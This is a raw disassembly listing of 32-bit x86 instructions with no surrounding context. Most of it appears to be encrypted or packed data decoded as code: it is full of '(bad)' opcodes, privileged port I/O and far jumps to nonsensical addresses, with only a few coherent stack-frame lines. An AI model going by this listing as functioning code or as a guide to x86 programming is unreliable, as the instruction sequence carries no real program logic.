  419fdc:	sub    ah,BYTE PTR [eax]
  419fde:	(bad)  
  419fdf:	jmp    0x41a036
  419fe1:	jmp    0x419fea
  419fe3:	pop    esi
  419fe4:	cmp    BYTE PTR [eax-0x78],cl
  419fe7:	push   ebx
  419fe8:	test   BYTE PTR [ebx-0x68],0x65
  419fec:	sub    BYTE PTR [edi],dl
  419fee:	test   al,0xa3
  419ff0:	hlt    
  419ff1:	dec    edx
  419ff2:	mov    ds:0x7ab301be,al
  419ff7:	xchg   esi,eax
  419ff8:	inc    edx
  419ff9:	adc    al,0x28
  419ffb:	adc    BYTE PTR [ecx],ah
  419ffd:	std    
  419ffe:	sti    
  419fff:	lods   al,BYTE PTR ds:[esi]
  41a000:	retf   
  41a001:	jg     0x41a080
  41a003:	nop
  41a004:	jnp    0x419fa9
  41a006:	jmp    0x419fc5
  41a008:	arpl   WORD PTR [ebx+0x3e],dx
  41a00b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a00c:	adc    al,0x6f
  41a00e:	pop    ecx
  41a00f:	dec    edx
  41a010:	cmp    al,0xed
  41a012:	int    0xd2
  41a014:	out    dx,al
  41a015:	pusha  
  41a016:	dec    eax
  41a017:	in     eax,0x22
  41a019:	dec    edx
  41a01a:	xchg   esp,eax
  41a01b:	out    0xc3,eax
  41a01d:	adc    dl,cl
  41a01f:	push   es
  41a020:	push   ebp
  41a021:	leave  
  41a022:	and    BYTE PTR [edi],dh
  41a024:	fnstsw WORD PTR [esi+0xfdcbeb0]
  41a02a:	sbb    DWORD PTR [edi+0x6e],ebx
  41a02d:	add    eax,DWORD PTR [eax]
  41a02f:	jle    0x41a077
  41a031:	ins    BYTE PTR es:[edi],dx
  41a032:	or     eax,edi
  41a034:	push   0x14f95c39
  41a039:	stc    
  41a03a:	es jb  0x419fe8
  41a03d:	jp     0x41a06c
  41a03f:	pop    es
  41a040:	sub    al,0xce
  41a042:	call   0x8fbc7f97
  41a047:	mov    ch,BYTE PTR [ebx+0x22a3e8f3]
  41a04d:	shr    DWORD PTR [ecx-0x49182ebc],0xfa
  41a054:	fs sub eax,0x87b01575
  41a05a:	cmc    
  41a05b:	es in  al,0xf0
  41a05e:	inc    ebx
  41a05f:	outs   dx,BYTE PTR ds:[esi]
  41a060:	sub    al,0x53
  41a062:	rcl    esi,1
  41a064:	or     eax,0x1d32bdef
  41a069:	icebp  
  41a06a:	dec    ebx
  41a06b:	in     eax,dx
  41a06c:	mov    ah,0x7
  41a06e:	jo     0x41a03e
  41a070:	mov    ds:0xc46c9436,al
  41a075:	pop    edi
  41a076:	je     0x41a040
  41a078:	rcr    BYTE PTR [esi+0x7d8e480e],1
  41a07e:	shr    bl,1
  41a080:	push   esp
  41a081:	mov    ds:0x6943530b,al
  41a086:	daa    
  41a087:	dec    eax
  41a088:	sub    ecx,DWORD PTR [edi+0x2]
  41a08b:	jl     0x41a027
  41a08d:	push   es
  41a08e:	mov    ds:0x121def83,al
  41a093:	or     al,0x53
  41a095:	daa    
  41a096:	mov    ah,BYTE PTR [eax-0x18]
  41a099:	imul   BYTE PTR [edi]
  41a09b:	int3   
  41a09c:	retf   0xdcb6
  41a09f:	fdiv   QWORD PTR [ebx*8-0x6171f906]
  41a0a6:	repnz outs dx,DWORD PTR ds:[esi]
  41a0a8:	inc    eax
  41a0a9:	ins    DWORD PTR es:[edi],dx
  41a0aa:	inc    eax
  41a0ab:	push   esi
  41a0ac:	rcr    BYTE PTR [esi+0x556f2a98],1
  41a0b2:	ror    esi,0xa0
  41a0b5:	push   ebp
  41a0b6:	sub    al,0xa3
  41a0b8:	lahf   
  41a0b9:	adc    eax,0x5f6cec78
  41a0be:	push   ebp
  41a0bf:	sti    
  41a0c0:	ret    0xd880
  41a0c3:	push   es
  41a0c4:	cmp    DWORD PTR [esi],esi
  41a0c6:	jns    0x41a085
  41a0c8:	cmp    eax,0xbd217a4a
  41a0cd:	jne    0x41a0a0
  41a0cf:	hlt    
  41a0d0:	stc    
  41a0d1:	jle    0x41a095
  41a0d3:	xor    BYTE PTR [esi],ch
  41a0d5:	inc    esp
  41a0d6:	in     eax,dx
  41a0d7:	jmp    0x204b:0x45e6c5b9
  41a0de:	jle    0x41a117
  41a0e0:	test   al,0x6d
  41a0e2:	pop    es
  41a0e3:	jnp    0x41a10f
  41a0e5:	sbb    DWORD PTR [eax],ecx
  41a0e7:	push   ecx
  41a0e8:	dec    esp
  41a0e9:	out    0xbf,al
  41a0eb:	mov    dh,0x2f
  41a0ed:	aas    
  41a0ee:	retf   
  41a0ef:	into   
  41a0f0:	iret   
  41a0f1:	adc    eax,0xdc24c5ac
  41a0f6:	sub    edi,DWORD PTR [eax+0x3]
  41a0f9:	push   ecx
  41a0fa:	mov    edx,0x21b7dbe6
  41a0ff:	mov    ds:0xc9e764ae,eax
  41a104:	dec    esp
  41a105:	cmp    al,0xe
  41a107:	shl    bh,cl
  41a109:	jl     0x41a0c9
  41a10b:	icebp  
  41a10c:	lods   al,BYTE PTR ds:[esi]
  41a10d:	add    edx,DWORD PTR [edx+0x69]
  41a110:	jmp    0xbab8508a
  41a115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a116:	lods   al,BYTE PTR cs:[esi]
  41a118:	push   0x8a2d3f5f
  41a11d:	fld    DWORD PTR [ebp+esi*2-0x3c]
  41a121:	(bad)  
  41a123:	aaa    
  41a124:	ror    BYTE PTR [edx+0x28],0xcf
  41a128:	and    DWORD PTR [ecx+0x4f],esi
  41a12b:	aaa    
  41a12c:	fwait
  41a12d:	scas   al,BYTE PTR es:[edi]
  41a12e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a12f:	in     eax,0x21
  41a131:	jmp    0x929:0xa5d56188
  41a138:	and    ah,ah
  41a13a:	push   ebx
  41a13b:	in     eax,dx
  41a13c:	in     eax,dx
  41a13d:	mov    DWORD PTR [eax-0x6ac30070],esi
  41a143:	pop    esi
  41a144:	xor    al,0xb9
  41a146:	shl    BYTE PTR [esi+ebp*8+0x2],0x95
  41a14b:	pushf  
  41a14c:	pop    es
  41a14d:	ret    
  41a14e:	fisubr WORD PTR [ecx-0x54]
  41a151:	jmp    0xd6f33872
  41a156:	ror    ebp,0xd
  41a159:	dec    ebp
  41a15a:	xor    eax,0x7a994a80
  41a15f:	push   ecx
  41a160:	pop    ss
  41a161:	jp     0x41a1d9
  41a163:	fcmovbe st,st(2)
  41a165:	pop    ss
  41a166:	fs pusha 
  41a168:	sbb    al,ah
  41a16a:	pop    eax
  41a16b:	es addr16 aam 0xf9
  41a16f:	mov    edi,0xe4bfe327
  41a174:	adc    bh,al
  41a176:	inc    edx
  41a177:	inc    ebp
  41a178:	jns    0x41a132
  41a17a:	mov    ds:0x2a89fa86,al
  41a17f:	add    BYTE PTR [eax],al
  41a181:	mov    dl,bl
  41a183:	enter  0xea4d,0xe4
  41a187:	sub    BYTE PTR [edi-0x75289fcc],bl
  41a18d:	ret    0x6998
  41a190:	pop    esp
  41a191:	adc    DWORD PTR [ebp+0x30013548],0x21
  41a198:	loopne 0x41a219
  41a19a:	out    0x9f,eax
  41a19c:	(bad)  
  41a19d:	js     0x41a1cb
  41a19f:	(bad)  
  41a1a0:	sbb    dl,dl
  41a1a2:	fdiv   st(5),st
  41a1a4:	mov    edi,DWORD PTR [eax+esi*1+0x70839e80]
  41a1ab:	xchg   ecx,eax
  41a1ac:	push   ss
  41a1ad:	xor    cl,bh
  41a1af:	out    dx,eax
  41a1b0:	ret    0xc462
  41a1b3:	xor    eax,0x3cd77541
  41a1b8:	or     ebx,DWORD PTR [esi+0x1e]
  41a1bb:	xor    DWORD PTR [eax],ebp
  41a1bd:	dec    eax
  41a1be:	stos   BYTE PTR es:[edi],al
  41a1bf:	aad    0xe0
  41a1c1:	sub    al,0x0
  41a1c3:	jecxz  0x41a1ad
  41a1c5:	enter  0x4198,0xa8
  41a1c9:	repnz mov DWORD PTR [ecx-0x2b],edx
  41a1cd:	lahf   
  41a1ce:	jl     0x41a20f
  41a1d0:	sbb    bl,BYTE PTR [esi]
  41a1d2:	mov    ?,WORD PTR [edx-0x2e]
  41a1d5:	ficomp DWORD PTR [ecx+edi*8-0x2ec4ba6b]
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	push   ds
  41a208:	ret    0x99d3
  41a20b:	outs   dx,BYTE PTR ds:[esi]
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	(bad)  
  41a214:	mov    ecx,0xe6674d65
  41a219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a21a:	iret   
  41a21b:	(bad)  
  41a21c:	jbe    0x41a1e7
  41a21e:	mov    edi,0x1daba146
  41a223:	out    dx,eax
  41a224:	ds xor esp,edx
  41a227:	lahf   
  41a228:	stos   BYTE PTR es:[edi],al
  41a229:	mov    es,WORD PTR [edi+0xe7c3016]
  41a22f:	push   ss
  41a230:	aam    0xdf
  41a232:	retf   0xfce2
  41a235:	ror    DWORD PTR [eax],1
  41a237:	mov    ah,bh
  41a239:	mov    al,0xcf
  41a23b:	ret    0xc763
  41a23e:	gs in  eax,dx
  41a240:	add    ch,BYTE PTR ds:0x12f8df9d
  41a246:	and    DWORD PTR [esi],ebx
  41a248:	inc    edi
  41a249:	int3   
  41a24a:	adc    ecx,DWORD PTR [edi+0x25cf6c82]
  41a250:	inc    ecx
  41a251:	sar    BYTE PTR [edi+0x3d],cl
  41a254:	sub    DWORD PTR [esp+eiz*2+0x7ce9cd1b],edx
  41a25b:	outs   dx,BYTE PTR ds:[esi]
  41a25c:	mov    ecx,0x4bdf4d51
  41a261:	enter  0x4c8,0x2b
  41a265:	mov    bl,BYTE PTR [ecx-0x63]
  41a268:	stos   BYTE PTR es:[edi],al
  41a269:	enter  0xfa90,0x35
  41a26d:	sub    eax,0xcc863504
  41a272:	mov    cl,0x1e
  41a274:	aas    
  41a275:	mov    esp,0x1a5b4191
  41a27a:	dec    eax
  41a27b:	adc    BYTE PTR [edx],dh
  41a27d:	sub    ah,BYTE PTR [edi+0x5aee477d]
  41a283:	pusha  
  41a284:	mov    dl,0xaf
  41a286:	mov    dh,0x84
  41a288:	pop    ecx
  41a289:	pop    ss
  41a28a:	pop    edi
  41a28b:	jns    0x41a247
  41a28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a28e:	mov    edi,0xd883c65c
  41a293:	and    DWORD PTR [edx+ebp*2],ecx
  41a296:	xchg   ebx,eax
  41a297:	int3   
  41a298:	out    0x55,al
  41a29a:	cdq    
  41a29b:	cli    
  41a29c:	popf   
  41a29d:	sar    esi,1
  41a29f:	lahf   
  41a2a0:	push   ecx
  41a2a1:	adc    al,0xc1
  41a2a3:	cmp    BYTE PTR ds:0x6deeb035,bh
  41a2a9:	sbb    ah,BYTE PTR [ecx+0x68daac33]
  41a2af:	jge    0x41a23c
  41a2b1:	inc    eax
  41a2b2:	rcl    BYTE PTR [ebp+0x17650344],0x6b
  41a2b9:	xor    DWORD PTR [ebp+ecx*1-0x50],0x30
  41a2be:	push   eax
  41a2bf:	pop    ds
  41a2c0:	out    0x2e,al
  41a2c2:	xchg   BYTE PTR [ebx],bh
  41a2c4:	pop    es
  41a2c5:	xchg   esp,eax
  41a2c6:	cmp    ebp,DWORD PTR [ebp+0x7dd349d4]
  41a2cc:	adc    DWORD PTR [ebx+0x23],esp
  41a2cf:	aaa    
  41a2d0:	jg     0x41a2d9
  41a2d2:	adc    al,0xd3
  41a2d4:	pop    ebp
  41a2d5:	mov    ds:0xf6158c44,al
  41a2da:	cmp    al,0x5
  41a2dc:	ins    DWORD PTR es:[edi],dx
  41a2dd:	mov    edi,0xd67dfc5d
  41a2e2:	ds dec ebx
  41a2e4:	mov    ebx,0x894ebeef
  41a2e9:	mov    dl,BYTE PTR [edx+0x1c]
  41a2ec:	adc    cl,BYTE PTR [esi+0x59]
  41a2ef:	out    0x56,al
  41a2f1:	fwait
  41a2f2:	sub    al,0xe1
  41a2f4:	inc    ebp
  41a2f5:	cli    
  41a2f6:	scas   eax,DWORD PTR es:[edi]
  41a2f7:	jns    0x41a284
  41a2f9:	les    eax,FWORD PTR [ebp-0x2f67d741]
  41a2ff:	sub    esi,esi
  41a301:	mov    es,esp
  41a303:	dec    esi
  41a304:	add    al,0x65
  41a306:	jmp    0xa61b649a
  41a30b:	mov    ebp,ss
  41a30d:	inc    esp
  41a30e:	jns    0x41a38d
  41a310:	xor    DWORD PTR [esi],eax
  41a312:	mov    dl,0x8f
  41a314:	dec    esi
  41a315:	dec    ebp
  41a316:	sbb    DWORD PTR [ebx+0x706e25ab],ebx
  41a31c:	inc    dl
  41a31e:	dec    BYTE PTR [di+0x4334]
  41a323:	sub    ebx,DWORD PTR ds:0x35d9f824
  41a329:	inc    esp
  41a32a:	loope  0x41a346
  41a32c:	jo     0x41a2c0
  41a32e:	lods   al,BYTE PTR ds:[esi]
  41a32f:	or     edi,DWORD PTR [esi-0x41af08b7]
  41a335:	pop    esp
  41a336:	jmp    0x41a2f1
  41a338:	ss mov edi,0xfdc25a6e
  41a33e:	sub    eax,0x196613de
  41a343:	jecxz  0x41a352
  41a345:	xor    BYTE PTR [edi+0x2a],bh
  41a348:	repz adc BYTE PTR [ebp+0x45],dh
  41a34c:	ins    BYTE PTR es:[edi],dx
  41a34d:	movhps xmm3,QWORD PTR [ebp+0xe]
  41a351:	repz and bl,0x61
  41a355:	push   esp
  41a356:	mov    dh,0xfd
  41a358:	pop    edi
  41a359:	cmp    ah,bh
  41a35b:	jmp    0x67d06c55
  41a360:	jmp    0xfabd:0x1f67867d
  41a367:	sbb    cl,BYTE PTR [eax]
  41a369:	mov    esp,0x86d5a3c2
  41a36e:	(bad)  
  41a36f:	sbb    DWORD PTR [edx+edi*8+0x58256abd],edx
  41a376:	jecxz  0x41a325
  41a378:	xor    DWORD PTR [ebx+0x35],ebp
  41a37b:	popa   
  41a37c:	sar    DWORD PTR [edi],cl
  41a37e:	(bad)
  41a383:	inc    edi
  41a384:	ins    DWORD PTR es:[edi],dx
  41a385:	pop    esp
  41a386:	dec    ebp
  41a387:	sar    DWORD PTR [ebp+0x6a],cl
  41a38a:	mov    al,0x1
  41a38c:	ret    
  41a38d:	es stos DWORD PTR es:[edi],eax
  41a38f:	fld    QWORD PTR [ebx+0x39]
  41a392:	in     al,0x85
  41a394:	inc    eax
  41a395:	inc    ebp
  41a396:	xchg   ecx,eax
  41a397:	sar    ah,1
  41a399:	sub    BYTE PTR [edx],bl
  41a39b:	rol    bl,1
  41a39d:	dec    edi
  41a39e:	jp     0x41a3b2
  41a3a0:	(bad)  
  41a3a2:	xchg   esp,eax
  41a3a3:	pop    ebx
  41a3a4:	sbb    al,0x6b
  41a3a6:	mov    ebp,0x1a183a8d
  41a3ab:	add    DWORD PTR [ebx],edi
  41a3ad:	inc    DWORD PTR [esi-0x12d5be17]
  41a3b3:	inc    ebx
  41a3b4:	push   ecx
  41a3b5:	mov    edi,?
  41a3b7:	mov    dh,0x86
  41a3b9:	js     0x41a424
  41a3bb:	jbe    0x41a390
  41a3bd:	push   0x1b
  41a3bf:	rcr    ch,0x17
  41a3c2:	mov    bl,0x8f
  41a3c4:	cmc    
  41a3c5:	or     eax,0x9295c6f8
  41a3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3cb:	pop    ebx
  41a3cc:	dec    edx
  41a3cd:	rol    DWORD PTR [ebx-0xe],1
  41a3d0:	ja     0x41a3d4
  41a3d2:	or     dh,BYTE PTR [esi]
  41a3d4:	out    dx,al
  41a3d5:	mov    esp,0x425d7c0b
  41a3da:	retf   
  41a3db:	and    cl,BYTE PTR [ecx]
  41a3dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3de:	and    ecx,DWORD PTR [ebp-0x3ba191]
  41a3e4:	fimul  DWORD PTR [esi+edx*1]
  41a3e7:	(bad)  
  41a3e8:	mov    bl,0x3a
  41a3ea:	mov    ds:0x872adf9d,al
  41a3ef:	sub    al,0xd8
  41a3f1:	bound  ebp,QWORD PTR [edi-0x36]
  41a3f4:	sub    dl,ch
  41a3f6:	mov    al,ds:0x62237757
  41a3fb:	mov    ecx,0x3aaa48f4
  41a400:	sub    BYTE PTR [eax],bl
  41a402:	fisttp WORD PTR [ebp+0x60]
  41a405:	push   esi
  41a406:	or     esi,DWORD PTR [ebp-0x4e]
  41a409:	xchg   edx,eax
  41a40a:	ficom  WORD PTR [esp+esi*4]
  41a40d:	iret   
  41a40e:	mov    al,ds:0x81197cda
  41a413:	je     0x41a442
  41a415:	adc    eax,0x3529371a
  41a41a:	stos   BYTE PTR es:[edi],al
  41a41b:	push   ds
  41a41c:	jns    0x41a47b
  41a41e:	mov    ah,0x84
  41a420:	(bad)  
  41a422:	jg     0x41a437
  41a424:	scas   eax,DWORD PTR es:[edi]
  41a425:	popw   ss
  41a427:	arpl   WORD PTR [ecx+eax*1],cx
  41a42a:	sub    BYTE PTR [eax],bl
  41a42c:	add    BYTE PTR [ebx+esi*1+0x3956e317],dl
  41a433:	mov    eax,0xb8ba84a7
  41a438:	out    0x90,al
  41a43a:	test   al,0x40
  41a43c:	mov    cl,0x48
  41a43e:	mov    edi,0x775f32f3
  41a443:	mov    dl,0xfc
  41a445:	adc    DWORD PTR [eax+eax*1+0x21],edi
  41a449:	psubsb mm3,QWORD PTR [edx+0x0]
  41a44d:	adc    DWORD PTR [ecx-0x44bc26e0],eax
  41a453:	cmp    al,0xdb
  41a455:	and    dl,BYTE PTR [eax-0x3dcf0edf]
  41a45b:	test   BYTE PTR [ecx-0x2],cl
  41a45e:	cmp    ah,BYTE PTR ds:0x43971691
  41a464:	repz mov esp,0x6ac5ac47
  41a46a:	je     0x41a48a
  41a46c:	pop    es
  41a46d:	fdivr  QWORD PTR [esi+0x2a]
  41a470:	mov    dl,BYTE PTR [esi]
  41a472:	cmp    eax,0x1ac718a9
  41a477:	js     0x41a41f
  41a479:	mov    DWORD PTR [ecx-0x48],ecx
  41a47c:	and    eax,0x14cd9a42
  41a481:	xchg   esp,eax
  41a482:	and    eax,0x59eb7de7
  41a487:	je     0x41a4df
  41a489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a48a:	out    dx,eax
  41a48b:	scas   eax,DWORD PTR es:[edi]
  41a48c:	fsub   st(6),st
  41a48e:	inc    edi
  41a48f:	stos   DWORD PTR es:[edi],eax
  41a490:	mov    ds:0x23ed0714,al
  41a495:	lods   al,BYTE PTR ds:[esi]
  41a496:	and    al,0xe4
  41a498:	cmp    ebp,ebp
  41a49a:	or     eax,0xe47df21f
  41a49f:	std    
  41a4a0:	mov    eax,0xb0b1bd9e
  41a4a5:	imul   ebx,DWORD PTR [ebx-0x41],0x114ce5e6
  41a4ac:	xchg   edi,eax
  41a4ad:	mov    eax,ds:0x6471cb7
  41a4b2:	cmp    BYTE PTR [edi-0x58431739],ch
  41a4b8:	sub    al,0xe6
  41a4ba:	xor    al,0xb9
  41a4bc:	push   cs
  41a4bd:	imul   ebx,DWORD PTR [eax],0xad3c6748
  41a4c3:	lock mov esp,0xd93bfdaf
  41a4c9:	dec    edx
  41a4ca:	jno    0x41a4b0
  41a4cc:	repnz sbb al,0x16
  41a4cf:	xor    cl,bh
  41a4d1:	mov    esi,0x2ae24236
  41a4d6:	bound  edi,QWORD PTR [ebp+0x463d8d1f]
  41a4dc:	rcr    BYTE PTR [esi-0x47],cl
  41a4df:	aam    0x4f
  41a4e1:	bound  edi,QWORD PTR [ebx+0x5438844]
  41a4e7:	aaa    
  41a4e8:	push   eax
  41a4e9:	lds    ebx,FWORD PTR [edi]
  41a4eb:	in     eax,dx
  41a4ec:	and    ecx,esp
  41a4ee:	sti    
  41a4ef:	sti    
  41a4f0:	xor    DWORD PTR [esi],0xac12f759
  41a4f6:	mov    esi,0x2dd351f2
  41a4fb:	and    eax,0x6856534a
  41a500:	inc    esp
  41a501:	sar    ch,0xe3
  41a504:	mov    cl,0xe1
  41a506:	mov    ch,al
  41a508:	in     eax,dx
  41a509:	imul   ecx,DWORD PTR [edi],0xffffff8c
  41a50c:	jae    0x41a4d4
  41a50e:	cmp    ch,ah
  41a510:	pop    ecx
  41a511:	or     ebx,edi
  41a513:	jno    0x41a4b5
  41a515:	imul   ebx,ebx,0xffffffd0
  41a518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a519:	push   edi
  41a51a:	fsub   QWORD PTR ds:0xa5be2d6c
  41a520:	call   0x529f:0x404d1185
  41a527:	les    ebp,FWORD PTR [ecx]
  41a529:	pop    ebx
  41a52a:	loopne 0x41a532
  41a52c:	add    eax,0x8af2e4d1
  41a531:	(bad)  
  41a532:	xor    al,0xe9
  41a534:	popf   
  41a535:	rcr    dh,1
  41a537:	jo     0x41a59b
  41a539:	pop    ebx
  41a53a:	jae    0x41a4e2
  41a53c:	imul   eax,DWORD PTR [edi-0x1206261a],0xe478f2cb
  41a546:	pop    ecx
  41a547:	push   edx
  41a548:	mov    bl,0x7b
  41a54a:	in     eax,dx
  41a54b:	in     al,dx
  41a54c:	push   esp
  41a54d:	mov    dh,0x5c
  41a54f:	retf   0x50ed
  41a552:	(bad)  
  41a553:	retf   0x1a34
  41a556:	cmp    BYTE PTR [ebx],dh
  41a558:	xor    eax,0xc6c9b8ec
  41a55d:	cdq    
  41a55e:	jp     0x41a529
  41a560:	stos   BYTE PTR es:[edi],al
  41a561:	inc    esp
  41a562:	stos   DWORD PTR es:[edi],eax
  41a563:	mov    edi,0xa0df1908
  41a568:	aad    0x36
  41a56a:	mov    esp,esp
  41a56c:	aas    
  41a56d:	jecxz  0x41a550
  41a56f:	mov    fs,WORD PTR [esp+esi*1]
  41a572:	shr    edx,0xf5
  41a575:	es pop edx
  41a577:	test   bh,bl
  41a579:	mov    ds:0x382d0f8,al
  41a57e:	pushf  
  41a57f:	addr16 mov ebp,0x321b6129
  41a585:	fiadd  DWORD PTR [esi+0x49]
  41a588:	dec    ebx
  41a589:	mov    bl,0xe0
  41a58b:	ins    BYTE PTR es:[edi],dx
  41a58c:	mov    dh,0xb3
  41a58e:	mov    eax,ds:0x6120336f
  41a593:	imul   edx,DWORD PTR [edi],0x3c363cc0
  41a599:	jae    0x41a522
  41a59b:	bound  eax,QWORD PTR [esi+edi*1]
  41a59e:	fldcw  WORD PTR [ebx+edi*1]
  41a5a1:	mov    ah,0x2f
  41a5a3:	or     bl,BYTE PTR [edx+esi*1+0x8712205]
  41a5aa:	mov    ds:0x5b10cbe1,eax
  41a5af:	sub    esp,DWORD PTR [eax-0x5d0e68cf]
  41a5b5:	ss (bad) 
  41a5b8:	fbld   TBYTE PTR cs:[ecx]
  41a5bb:	add    edx,ebx
  41a5bd:	icebp  
  41a5be:	add    BYTE PTR [edx+0x7],dl
  41a5c1:	inc    edi
  41a5c2:	ds cmp eax,0xedce3171
  41a5c8:	inc    esi
  41a5c9:	sbb    al,0x23
  41a5cb:	xchg   ebx,eax
  41a5cc:	(bad)  [edx+0x6ac946b1]
  41a5d2:	push   esp
  41a5d3:	lds    edx,FWORD PTR [esi+0x39]
  41a5d6:	popf   
  41a5d7:	add    ecx,ebx
  41a5d9:	mov    al,ds:0xbfe6b713
  41a5de:	mov    dl,BYTE PTR [ebx+eiz*4-0x2d]
  41a5e2:	pop    edi
  41a5e3:	xchg   edi,eax
  41a5e4:	inc    edx
  41a5e5:	(bad)  
  41a5e6:	push   esi
  41a5e7:	rcr    BYTE PTR [ebx],1
  41a5e9:	pop    dx
  41a5eb:	jne    0x41a5aa
  41a5ed:	jmp    0x41a5e5
  41a5ef:	test   al,0x22
  41a5f1:	mov    al,BYTE PTR [ebx-0x5da55d70]
  41a5f7:	xor    ch,BYTE PTR [ecx]
  41a5f9:	int    0xe
  41a5fb:	and    al,0x68
  41a5fd:	mov    edx,0x835a03c3
  41a602:	(bad)  
  41a603:	fcmovnbe st,st(0)
  41a605:	mov    al,0xa4
  41a607:	inc    edi
  41a608:	and    BYTE PTR [ecx],ch
  41a60a:	xor    eax,DWORD PTR [eax-0x272e59aa]
  41a610:	mov    eax,es:0xbd73697a
  41a616:	gs push ebp
  41a618:	je     0x41a644
  41a61a:	pushf  
  41a61b:	dec    edi
  41a61c:	or     BYTE PTR [ecx+ebx*4],dl
  41a61f:	sbb    DWORD PTR [ecx+0x7b],eax
  41a622:	dec    esp
  41a623:	in     al,dx
  41a624:	lds    eax,FWORD PTR [edi+0x3c]
  41a627:	std    
  41a628:	xchg   ebp,eax
  41a629:	test   BYTE PTR [ebx+ebp*8],bh
  41a62c:	jecxz  0x41a622
  41a62e:	and    al,BYTE PTR [eax-0x769776f5]
  41a634:	mov    esi,0xe6221b80
  41a639:	rol    BYTE PTR [eax+0x3e01bdb5],cl
  41a63f:	dec    edx
  41a640:	les    ebx,FWORD PTR [ebx]
  41a642:	test   al,0x78
  41a644:	retf   
  41a645:	pop    ebx
  41a646:	clc    
  41a647:	jo     0x41a5fc
  41a649:	cmp    al,0xbf
  41a64b:	push   ebp
  41a64c:	sbb    DWORD PTR [eax+0x65e9c98b],edx
  41a652:	jns    0x41a6bc
  41a654:	dec    eax
  41a655:	push   esi
  41a656:	hlt    
  41a657:	push   es
  41a658:	sti    
  41a659:	xor    eax,0x39868d2b
  41a65e:	mov    ebx,0x22635e55
  41a663:	(bad)  [esi+0x11]
  41a666:	jg     0x41a6ab
  41a668:	jp     0x41a698
  41a66a:	jmp    0xe72b07c4
  41a66f:	popa   
  41a670:	dec    edi
  41a671:	xor    ebp,DWORD PTR [ebx+0x114af8bf]
  41a677:	icebp  
  41a678:	dec    esp
  41a679:	pop    esp
  41a67a:	sbb    BYTE PTR [ecx-0x7],al
  41a67d:	pop    esi
  41a67e:	jne    0x41a69c
  41a680:	adc    al,0x7d
  41a682:	fnstcw WORD PTR [ecx+esi*8-0x273cd701]
  41a689:	jmp    0x3dd5:0x8a551114
  41a690:	dec    esp
  41a691:	jno    0x41a701
  41a693:	mov    esi,0x932dd379
  41a698:	cmp    DWORD PTR [edi],eax
  41a69a:	ss xchg ebx,eax
  41a69c:	xor    ah,dl
  41a69e:	mov    eax,0xde011c09
  41a6a3:	bound  edi,QWORD PTR [ecx-0x177e861b]
  41a6a9:	sbb    ebp,eax
  41a6ab:	lea    ecx,[edx+0x31]
  41a6ae:	jb     0x41a63a
  41a6b0:	add    dh,ch
  41a6b2:	or     esp,DWORD PTR [esi]
  41a6b4:	setge  BYTE PTR [edi]
  41a6b7:	jns    0x41a644
  41a6b9:	mov    eax,0x1940f204
  41a6be:	xchg   ecx,eax
  41a6bf:	push   es
  41a6c0:	adc    eax,0x14ab87af
  41a6c5:	arpl   di,cx
  41a6c7:	jo     0x41a6ac
  41a6c9:	cs xor al,0x90
  41a6cc:	or     DWORD PTR [edi],esp
  41a6ce:	neg    BYTE PTR [ecx]
  41a6d0:	bound  ebx,QWORD PTR [ebp-0x60]
  41a6d3:	or     al,0xf5
  41a6d5:	jae    0x41a70c
  41a6d7:	add    BYTE PTR [edi],bl
  41a6d9:	inc    esi
  41a6da:	aas    
  41a6db:	mov    BYTE PTR [edx],ah
  41a6dd:	ror    ebx,1
  41a6df:	mov    ds:0xb7127ee,eax
  41a6e4:	pmullw mm7,QWORD PTR [ebp+0x23]
  41a6e8:	fwait
  41a6e9:	stos   BYTE PTR es:[edi],al
  41a6ea:	sub    bl,dl
  41a6ec:	xor    esi,DWORD PTR [ecx+0x29]
  41a6ef:	jl     0x41a6d0
  41a6f1:	pop    edx
  41a6f2:	dec    eax
  41a6f3:	sub    cl,BYTE PTR [ecx]
  41a6f5:	cmova  esi,DWORD PTR ds:0xaad60405
  41a6fc:	pop    ecx
  41a6fd:	mov    al,0x10
  41a6ff:	xor    DWORD PTR [ebx-0x1f6e5af5],ecx
  41a705:	inc    esi
  41a706:	pop    ebx
  41a707:	dec    ebx
  41a708:	dec    ebx
  41a709:	imul   ebx,DWORD PTR [ecx+0x23],0x11
  41a70d:	repnz inc ebp
  41a70f:	ror    DWORD PTR [edx+eax*1],1
  41a712:	mov    ebx,0xf05dad30
  41a717:	inc    esp
  41a718:	ins    BYTE PTR es:[edi],dx
  41a719:	clc    
  41a71a:	iret   
  41a71b:	xor    ebp,DWORD PTR [eax-0x43]
  41a71e:	and    al,0x52
  41a720:	mov    BYTE PTR [edx+0x2dfc9022],cl
  41a726:	das    
  41a727:	jbe    0x41a6f5
  41a729:	outs   dx,DWORD PTR ds:[esi]
  41a72a:	cwde   
  41a72b:	or     ch,dh
  41a72d:	push   cs
  41a72e:	xchg   esi,ebx
  41a730:	inc    ecx
  41a731:	fmul   st,st(3)
  41a733:	mov    ds:0xcf6b946d,al
  41a738:	dec    esi
  41a739:	cmp    eax,DWORD PTR [esi]
  41a73b:	xchg   edx,eax
  41a73c:	pusha  
  41a73d:	or     BYTE PTR [ecx-0x3f],cl
  41a740:	ficomp DWORD PTR [eax-0x63]
  41a743:	lahf   
  41a744:	in     al,dx
  41a745:	ins    DWORD PTR es:[edi],dx
